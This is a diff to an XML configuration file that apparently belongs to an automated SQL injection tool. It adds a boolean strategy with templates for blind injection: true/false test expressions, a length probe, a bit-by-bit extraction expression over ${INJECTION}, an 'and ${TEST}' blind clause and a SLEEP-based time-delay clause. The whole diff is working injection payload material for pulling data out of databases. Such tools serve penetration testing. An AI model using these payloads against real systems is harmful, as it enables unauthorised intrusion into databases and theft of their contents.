@@ -128,5 +128,41 @@ replace(
             <capacity>(select '${LEAD}${INDICE}' || ${CALIBRATOR})</capacity>
             <orderBy>order by 1337</orderBy>
         </normal>
+        <boolean>
+            <test>
+                <false>0 = 1</false>
+                <false>0 %21= 0</false>
+                <false>0.1 %21= 0.1</false>
+                <false>1 = 2</false>
+                <false>1 %21= 1</false>
+                <false>2 %21= 2</false>
+                <true>1.2 = 1.2</true>
+                <true>0.1 = 0.1</true>
+                <true>0 %21= 1</true>
+                <true>1 = 1</true>
+                <true>2 = 2</true>
+                <true>1 %21= 2</true>
+                <initialization>0%2b1 = 1</initialization>
+                <bit>
+unicode(
+    substr(
+        ${INJECTION}, 
+        ${INDEX}, 
+        1
+    )
+) 
+%26 ${BIT}
+                </bit>
+                <length>length(${INJECTION}) > ${INDEX}</length>
+            </test>
+            <blind>and ${TEST}</blind>
+            <time>
+and if(
+    ${TEST}, 
+    1, 
+    SLEEP(${SLEEP_TIME})
+)
+            </time>
+        </boolean>
     </strategy>
 </model>
